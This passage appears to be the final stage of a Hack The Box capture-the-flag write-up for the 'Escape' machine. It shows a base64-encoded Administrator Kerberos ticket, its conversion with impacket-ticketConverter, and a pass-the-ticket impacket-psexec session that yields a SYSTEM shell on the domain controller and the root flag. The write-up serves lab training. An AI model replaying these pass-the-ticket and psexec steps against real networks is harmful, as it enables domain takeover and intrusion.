JJY1IKICAgICAgOTlkTFBkRmVpeVpPRmlhMUFCa2lRS0dPSHNBWnBrbi9jdWVremhxNy91Zjg2MEE0WWplMEpTY1AybUMwVFNZWXV1V3dZa0cxL0tYRWk4cUMKICAgICAgenhjR1h2ZEh0a0Yzc081eEd0WlNZbWwwMDlnOUZRKzNnREZ5aHkzUWpWejBMNy9XVGpmOENzdUU4RE1vNTJXUENEUmVSS21jdis3OVhDdTAKICAgICAgNDc4MzRjclpzdUVBbnNzVFFoZ29JKzNMUXZvdGlZak9tWjU1WWo2eEJ3Ym5aazk3ckI4RHNTdnJ3Tjlwelo4M2dGbzdmNjB0ZWF4TUYrTWYKICAgICAgc0sxQ1I2QlhrVVFVR0RIeWdOVUxXNnFGbE9YbUpJY0ZxbnVJbXg1UHJoNFdtdkxBOEJEVDg0TzNqSkxKZTQ3QmNVRE9FVUZsZEhpTnI5dFMKICAgICAgL1dpajlYNUY2bEprSHdvWFpnVlliMHluWWVFdjJDRGR2SHkxTk1HU0FCUjFRZW9mYWlQbTY5L2tHQlUvTEJ6bHNybXJtRnNHT0IxOTZSa3oKICAgICAgS2hnQmMrOUs1UTMxcnVPTW4wNVlYMUQxc3BZMnppaXhScWNnT0hwK0E0ZzE3QlBNbndZSHpyd1ZzMWJSRjlJNDYwNkNlTGJGM0g3dFJqd1QKICAgICAgZVJteVJSWnZ0amFVeWpPSlR5YjcvT2h6NWczZERQcDJhQUcrbFNqeU9CeXdxcnBXQkY0VTM3UG8vRkxsYzVFNFg0OWR4aWttMW04K3dtOGoKICAgICAgTnhoM0FmOWFjRVJGb3EvODFidzkyenk1NmF6YThMMGxMbGJabWcrVGhmL2d6UU1VbU9sd3ppZUxuRmxNMTJVR0Fkclc2dFErRDJXbGdTTWwKICAgICAgRHh2YllQRHRnaEc3WEVOSmVDREtZQlJMUG92TDdPenVoNlhpVTlQZWRPY2ZLWUQyekRzZWZTWWs1WnJ4eFlkSU1OTnVSdzZuOUxhV0JFaEsKICAgICAgQ0x4cVN5MG85bGRESkhkUFBYOVZkMzRWaWJ6ZHRDemhibFJSZlBsTnZ2VUFXSHlqenBXN3JpMGk4N0FUVFl6MnZjK3NKZWh6aWM0RERFa0gKICAgICAgS2xHOTRmZkphUzlxNWNlb2RjN2VCcjdnOC9nUUtWbk5iOXV2MTVteWVBMDQvWDZiczl0RHl6SDQwRjZIUTRHQjlMOCthZHQ4d2pTbnE1cEQKICAgICAgdjdoUFdVaC9xM0l3czBib0VsMUNtZDk2NUg3anRySVoxQTR4UFpwRndHblU5SVNaMnYrVS85bjN5UDlPUTcvZy9vUlg5ZzlPSFBEUjIzTHMKICAgICAgOUdyUDJlbWRlbnNaWlNNK0VGNEtlTmVobnY5RjFJQ3lSL1pkVERmczIzZWFsNFpQRmVzL3Znd0F1a0JsOHRrbm9PN0x3aUV2eWx2R05mK1cKICAgICAgcVM4a0RCWWs5RkNBSzZ6SWo0VDNxa1NXVWY0ZWVxREErRTB2dUp0dExiZnNNcS9EaTE4NGlBZ1JaRmV4NndQc2dzV1I1Rm9TQ3gxdU5DSDUKICAgICAgUzhEcEdaSjg3WWFaaSt1T1Z6eW5qRXY2dWdMYW96R3libDVEK0o2bEo0Ti95NTV1SWJuN2FmbnVXMHgwNW5ZSUd2cjZwNHVrR1Z0eVBkaHIKICAgICAgc2grV1VEdmpabkIzOEhXQkFnbjRhaFVxUGJkWXd5dTBYSVBQYVV3TUttdnJ4dnVLRWhCb0tnOEt4Z1Q5WEVPK1dOYmZ0bXlRK2ZxMHdwZHAKICAgICAgNTRSL04yN3JQamZiT2hCNDRzZlZ2dFJtWktQMmpXRGNKdE5QMlJYd0I2U1pLMktzMXAzcmxZdDA0ZlM3N3ZhaitoeTFiK0txd3RRa1dzcEkKICAgICAgOGFMazZYVThZUm10c0tWRS9GZlVQYU9CMVRDQjBxQURBZ0VBb29IS0JJSEhmWUhFTUlIQm9JRytNSUc3TUlHNG9Cc3dHYUFEQWdFWG9SSUUKICAgICAgRUMxZHJiMGMrY1RjeitBU1dIdkx0cStoREJzS1UwVlJWVVZNTGtoVVFxSWFNQmlnQXdJQkFhRVJNQThiRFVGa2JXbHVhWE4wY21GMGIzS2oKICAgICAgQndNRkFBRGhBQUNsRVJnUE1qQXlNekF5TWpZeE5UQTBNamRhcGhFWUR6SXdNak13TWpJM01ERXdOREkzV3FjUkdBOHlNREl6TURNd05URTEKICAgICAgTURReU4xcW9EQnNLVTBWUlZVVk1Ma2hVUXFrZk1CMmdBd0lCQXFFV01CUWJCbXR5WW5SbmRCc0tjMlZ4ZFdWc0xtaDBZZz09

```c
$ impacket-ticketConverter Administrator.kirbi Administrator.ccache                                                                                                      
Impacket v0.10.1.dev1+20230203.111903.32178de - Copyright 2022 Fortra

[*] converting kirbi to ccache...
[+] done
```

```c
$ export KRB5CCNAME=/media/sf_infosec/htb/machines/escape/files/Administrator.ccache
```

```c
$ impacket-psexec sequel.htb/Administrator@dc.sequel.htb -k -no-pass
Impacket v0.10.1.dev1+20230203.111903.32178de - Copyright 2022 Fortra

[*] Requesting shares on dc.sequel.htb.....
[*] Found writable share ADMIN$
[*] Uploading file sIPjSCvC.exe
[*] Opening SVCManager on dc.sequel.htb.....
[*] Creating service LOGK on dc.sequel.htb.....
[*] Starting service LOGK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## root.txt

```c
C:\Users\Administrator\Desktop> type root.txt
d9fdae358a63f36abaa6cc21b97d9d5a
```
